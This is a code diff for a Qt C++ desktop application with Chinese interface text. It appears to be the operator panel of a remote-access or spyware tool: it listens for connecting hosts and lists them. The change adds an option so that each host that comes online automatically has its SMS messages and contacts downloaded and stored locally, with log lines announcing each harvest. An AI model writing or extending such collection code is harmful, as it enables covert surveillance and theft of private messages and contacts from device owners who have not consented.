@@ -31,6 +31,7 @@ void MainWindow::init()
     QObject::connect(&mSessionManager,SIGNAL(onNewSession(NetworkSession*)),this,SLOT(handleNewSession(NetworkSession*)));
     QObject::connect(&mSessionManager,SIGNAL(onStartSessionSuccess(QString,QString)),this,SLOT(onStartSessionSuccess(QString,QString)));
     QObject::connect(&mSessionManager,SIGNAL(onStartSessionFailed(QString,QString)),this,SLOT(onStartSessionFailed(QString,QString)));
+    QObject::connect(&mModel,SIGNAL(onHostOnline(QHostAddress,quint16)),this,SLOT(onHostOnline(QHostAddress,quint16)));
 }
 
 void MainWindow::initView()
@@ -67,6 +68,8 @@ void MainWindow::initView()
     ui->actionStartServer->setText(QStringLiteral("开始监听"));
     QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));
 
+    ui->actionAutoLoadData->setText(QStringLiteral("上线自动载入数据"));
+
     for(int i = 1; i<mModel.columnCount(); ++i) {
         ui->tableView->setColumnWidth(i, 150);
     }
@@ -77,6 +80,14 @@ void MainWindow::initView()
 void MainWindow::updateView()
 {
     ui->hostCountLabel->setText(QStringLiteral("主机数: %1, 选中主机数: %2").arg(mModel.rowCount()).arg(mModel.getSelectedCount()));
+}
+
+void MainWindow::onHostOnline(const QHostAddress& host, quint16 port)
+{
+    if(!ui->actionAutoLoadData->isChecked())return;
+    outputLogNormal(QStringLiteral("从 %1:%2 下载联系人和短信数据").arg(host.toString()).arg(port));
+    mSessionManager.startSessionOnHost(host, port, ACTION_UPLOAD_SMS);
+    mSessionManager.startSessionOnHost(host, port, ACTION_UPLOAD_CONTACT);
 }
 
 void MainWindow::handleServerStart()
@@ -153,6 +164,7 @@ void MainWindow::handleReceiveData(NetworkSession* networkSession, QByteArray da
     stream << jsonDocument.toJson();
     file.flush();
     file.close();
+    outputLogNormal(QStringLiteral("传输成功, 数据存储为: %1").arg(networkSession->getSessionName() + "/" + fileName));
     networkSession->deleteLater();
 }
 
